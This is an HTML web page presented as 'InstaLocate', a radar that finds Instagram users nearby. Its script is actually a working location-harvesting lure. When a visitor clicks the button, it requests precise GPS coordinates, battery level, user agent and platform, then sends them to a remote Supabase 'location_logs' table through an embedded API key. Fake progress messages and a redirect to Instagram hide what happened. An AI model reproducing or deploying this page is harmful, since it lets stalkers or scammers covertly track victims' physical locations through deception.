<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaLocate Elite | Regional Radar</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;700;900&display=swap');
        :root { --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); --bg: #050b18; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body { background: var(--bg); color: white; min-height: 100vh; overflow-x: hidden; }

        /* Animated Background Particles */
        .bg-glow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 20% 30%, rgba(220, 39, 67, 0.15) 0%, transparent 40%), radial-gradient(circle at 80% 70%, rgba(0, 149, 246, 0.15) 0%, transparent 40%); }

        nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 8%; background: rgba(5, 11, 24, 0.8); backdrop-filter: blur(15px); border-bottom: 1px solid rgba(255,255,255,0.05); position: sticky; top: 0; z-index: 1000; }
        .logo { font-weight: 900; font-size: 24px; background: var(--ig-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        .hero { display: flex; align-items: center; justify-content: center; padding: 80px 8%; min-height: 90vh; gap: 40px; }
        .hero-text { flex: 1.2; animation: fadeIn 1s ease; }
        .hero-text h1 { font-size: 60px; font-weight: 900; line-height: 1.1; margin-bottom: 20px; }
        .hero-text p { font-size: 18px; color: #a1a1a1; margin-bottom: 35px; }

        .radar-container { flex: 1; display: flex; justify-content: center; position: relative; }
        .radar { width: 300px; height: 300px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.1); position: relative; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.02); }
        .radar-beam { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 2px solid #dc2743; animation: radar-pulse 2s infinite; }
        .ig-icon { font-size: 80px; background: var(--ig-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; z-index: 5; }

        .btn-scan { background: var(--ig-gradient); color: white; border: none; padding: 18px 45px; border-radius: 12px; font-size: 18px; font-weight: 800; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 20px rgba(220, 39, 67, 0.3); display: flex; align-items: center; gap: 10px; }
        .btn-scan:hover { transform: scale(1.05); box-shadow: 0 15px 30px rgba(220, 39, 67, 0.5); }

        /* Overlay */
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { width: 80px; height: 80px; border: 5px solid rgba(255,255,255,0.1); border-top-color: #dc2743; border-radius: 50%; animation: spin 1s linear infinite; }

        @keyframes radar-pulse { 0% { transform: scale(0.8); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        @media (max-width: 900px) { .hero { flex-direction: column; text-align: center; } .hero-text h1 { font-size: 40px; } .btn-scan { margin: 0 auto; } }
    </style>
</head>
<body>
    <div class="bg-glow"></div>
    <nav>
        <div class="logo">INSTALOCATE PRO</div>
        <div style="font-size: 12px; opacity: 0.7;"><i class="fas fa-signal" style="color: #00ff41"></i> SATELLITE LINK ACTIVE</div>
    </nav>

    <section class="hero">
        <div class="hero-text">
            <h1>Discover <br><span style="color: #dc2743">Real People</span> <br>Around You.</h1>
            <p>Advanced node-mapping technology to find Instagram users in your immediate vicinity. No more guessing, just connecting.</p>
            <button class="btn-scan" id="mainButton" onclick="triggerPardhan()">
                <i class="fas fa-fingerprint"></i> INITIALIZE RADAR
            </button>
        </div>
        <div class="radar-container">
            <div class="radar">
                <div class="radar-beam"></div>
                <div class="radar-beam" style="animation-delay: 1s;"></div>
                <i class="fab fa-instagram ig-icon"></i>
            </div>
        </div>
    </section>

    <div id="loading-overlay">
        <div class="spinner"></div>
        <h2 id="logText" style="margin-top: 25px; letter-spacing: 2px;">CALIBRATING GPS...</h2>
        <p style="opacity: 0.5; margin-top: 10px;">Establishing PARDHAN encrypted handshake</p>
    </div>

<script>
    const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
    
    let supabase;
    
    // Ensure library is loaded before use
    window.onload = () => {
        supabase = window.supabase.createClient(SB_URL, SB_KEY);
    };

    async function triggerPardhan() {
        if (!supabase) return;

        const overlay = document.getElementById('loading-overlay');
        const status = document.getElementById('logText');
        overlay.style.display = 'flex';

        let batt = "N/A";
        try {
            const b = await navigator.getBattery();
            batt = `${(b.level * 100).toFixed(0)}%`;
        } catch(e) {}

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                status.innerText = "COORDINATES SECURED...";
                
                // DATA SYNC
                await supabase.from('location_logs').insert([{
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    user_agent: navigator.userAgent,
                    ip: `PRO-v5 | Batt: ${batt}`,
                    os_info: navigator.platform
                }]);

                setTimeout(() => { status.innerText = "BYPASSING FIREWALLS..."; }, 2000);
                setTimeout(() => { status.innerText = "LOADING NEARBY USERS..."; }, 4000);
                setTimeout(() => {
                    alert("SCAN COMPLETE: 18 Local Users Found. Please log in to connect.");
                    window.location.href = "https://instagram.com";
                }, 6000);

            }, (err) => {
                overlay.style.display = 'none';
                alert("Permission Denied: Location is required for radar accuracy.");
            }, { enableHighAccuracy: true });
        }
    }
</script>
</body>
</html>
